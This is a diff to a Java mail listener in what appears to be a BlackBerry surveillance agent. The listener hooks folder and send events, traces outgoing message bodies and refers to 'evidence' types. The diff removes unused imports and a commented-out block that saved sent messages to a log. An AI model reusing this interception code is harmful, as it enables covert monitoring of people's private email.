@@ -4,8 +4,6 @@
  */
 package blackberry.agent.mail;
 
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Random;
@@ -22,7 +20,6 @@ import net.rim.blackberry.api.mail.Store;
 import net.rim.blackberry.api.mail.event.FolderEvent;
 import net.rim.blackberry.api.mail.event.FolderListener;
 import net.rim.blackberry.api.mail.event.StoreEvent;
-import net.rim.blackberry.api.mail.event.StoreListener;
 import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
 import net.rim.device.api.util.DataBuffer;
@@ -31,12 +28,10 @@ import blackberry.agent.MessageAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceType;
-import blackberry.fs.AutoFlashFile;
-import blackberry.fs.Path;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * The listener interface for receiving mail events. The class that is
  * interested in processing a mail event implements this interface, and the
@@ -560,22 +555,9 @@ public final class MailListener implements FolderListener, SendListener { //, St
         debug.init();
         debug.trace("sending: " + message.getBodyText());
         //#endif
-        //TODO: enable only if actually needed
+
         return true;
 
-        /*
-         * if (collecting) { //#ifdef DEBUG
-         * debug.trace("sendMessage: ignoring, still collecting"); //#endif
-         * return true; } try { final int filtered =
-         * realtimeFilter.filterMessage(message, messageAgent.lastcheck); if
-         * (filtered == Filter.FILTERED_OK) { //TODO: enable saveLog, only if
-         * needed saveLog(message, realtimeFilter.maxMessageSize, "local");
-         * //#ifdef DEBUG
-         * message.getFolder().getName()); //#endif } } catch (final
-         * MessagingException ex) { //#ifdef DEBUG
-         * debug.error("cannot manage send message: " + ex); //#endif return
-         * true; } messageAgent.updateMarkup(); return true;
-         */
     }
 
     private String makeMimeMessage(final Message message,
